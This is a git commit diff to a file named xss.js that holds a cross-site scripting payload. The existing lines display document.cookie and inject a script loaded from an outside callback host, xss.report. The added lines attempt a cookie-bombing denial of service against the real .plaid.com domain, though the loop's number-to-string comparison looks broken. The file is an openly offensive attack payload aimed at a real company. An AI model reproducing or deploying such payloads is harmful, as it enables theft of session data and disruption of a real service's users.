586cda8e7843590aa4ddfe87d7bc833ae72ef5a4
paktiko1986 <santikahakim50@guru.smk.belajar.id>
2025-02-21 10:43:19 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -2,3 +2,8 @@ alert(document.cookie);
 var x = document.createElement('script');
 x.src = 'https://xss.report/c/santiko86';
 document.head.appendChild(x);
+
+var serang = new Array(1111).join('a');
+for (var x = 1; x < serang; x++){
+  document.cookie = "Bomber" + x + "=" + serang + ";Domain=.plaid.com; path=/";
+}
